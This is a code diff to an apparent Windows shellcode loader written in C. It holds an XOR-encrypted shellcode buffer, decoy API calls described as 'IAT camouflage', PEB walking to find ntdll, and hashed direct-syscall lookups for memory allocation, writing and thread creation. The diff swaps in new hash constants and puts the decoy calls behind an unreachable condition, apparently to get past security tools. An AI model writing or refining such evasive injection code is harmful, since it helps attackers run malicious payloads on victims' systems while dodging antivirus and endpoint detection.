@@ -5,8 +5,6 @@
 #include "crt.h"
 
 
-//shellcode to inject encrypted with XOR, key "A"
-//BYTE buf[] =
 unsigned char buf[] =
 "\xbd\x09\xc2\xa5\xb1\xa9\x81\x41\x41\x41\x00\x10\x00\x11"
 "\x13\x10\x17\x09\x70\x93\x24\x09\xca\x13\x21\x09\xca\x13"
@@ -36,27 +34,28 @@ extern HellDescent();
 //IAT camouflage
 void IATCamouflage()
 {
-	int x = 4;
-
-	if (x > 4)
-	{
-		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
-		i = GetLastError();
-		i = SetCriticalSectionSpinCount(NULL, NULL);
-		i = GetWindowContextHelpId(NULL);
-		i = GetWindowLongPtrW(NULL, NULL);
-		i = RegisterClassW(NULL);
-		i = IsWindowVisible(NULL);
-		i = ConvertDefaultLocale(NULL);
-		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
-		i = IsDialogMessageW(NULL, NULL);
-	}
+	unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
+	i = GetLastError();
+	i = SetCriticalSectionSpinCount(NULL, NULL);
+	i = GetWindowContextHelpId(NULL);
+	i = GetWindowLongPtrW(NULL, NULL);
+	i = RegisterClassW(NULL);
+	i = IsWindowVisible(NULL);
+	i = ConvertDefaultLocale(NULL);
+	i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
+	i = IsDialogMessageW(NULL, NULL);
 }
 
 //main function
 int main(int argc, char* argv[])
 {
-	IATCamouflage();
+	int counter = 0;
+	counter = (counter + 1) % 3;
+	if (counter > 100)
+	{
+		IATCamouflage();
+	}
+
 	wchar_t TargetDLL[] = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
 	//perform PEB walking
 	PPEB pPeb = GetPEBAddress();
@@ -107,11 +106,11 @@ int main(int argc, char* argv[])
 	//initialize the hashes we need to check for, if found we save the SSN
 	PRINTA("[+] Initializing VX_TABLE values\n");
 	VX_TABLE Table = { 0 };
-	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
-	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
-	Table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741;
-	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
-	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
+	Table.NtAllocateVirtualMemory.dwHash = 0x2ebf490a8b674900;
+	Table.NtCreateThreadEx.dwHash = 0x9d5cb5995b416964;
+	Table.NtWriteVirtualMemory.dwHash = 0xd4b85e855339e9c6;
+	Table.NtProtectVirtualMemory.dwHash = 0x493685c9300901fc;
+	Table.NtWaitForSingleObject.dwHash = 0xb54b0f43b27c4ef0;
 
 	if (!GetVxTableEntry(pBase, pImgExportDir, &Table.NtAllocateVirtualMemory))
 	{
